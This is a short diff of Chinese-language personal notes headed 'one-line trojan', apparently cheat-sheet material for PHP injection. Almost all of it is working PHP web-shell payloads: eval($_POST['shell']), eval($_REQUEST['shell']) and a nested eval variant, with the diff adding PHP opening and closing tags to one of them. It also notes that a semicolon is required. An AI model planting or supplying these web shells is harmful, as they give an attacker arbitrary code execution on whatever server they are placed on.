@@ -8,7 +8,7 @@ Created 星期五 22 十一月
 一句话木马
 
 php注入:
-eval($_POST['shell']);
+<?php eval($_POST['shell']); ?>
 eval($_REQUEST['shell']);
 eval("eval($_POST['shell']);")  注意要有分号
 
